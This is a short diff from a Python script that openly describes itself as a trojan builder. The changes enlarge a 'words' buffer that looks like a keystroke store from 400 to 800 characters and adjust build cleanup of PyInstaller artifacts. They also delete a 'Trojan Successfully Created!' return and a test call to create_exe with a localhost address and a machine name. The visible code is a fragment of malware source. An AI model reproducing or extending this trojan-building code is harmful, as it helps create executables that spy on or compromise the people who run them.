@@ -14,8 +14,8 @@ words = ""
 
 def rm_junks():
     global words
-    if len(words) >= 400:
-        additional = len(words) - 400
+    if len(words) >= 800:
+        additional = len(words) - 800
         words = words[additional:]
     else:
         pass
@@ -77,8 +77,3 @@ if __name__ == "__main__":
     shutil.rmtree("dist", ignore_errors=True)
     os.remove(f"{trojan_name}.spec")
     os.remove(filename)
-
-    return "✅Trojan Successfully Created!"
-
-
-print(create_exe('127.0.0.1', 'ComputerA'))
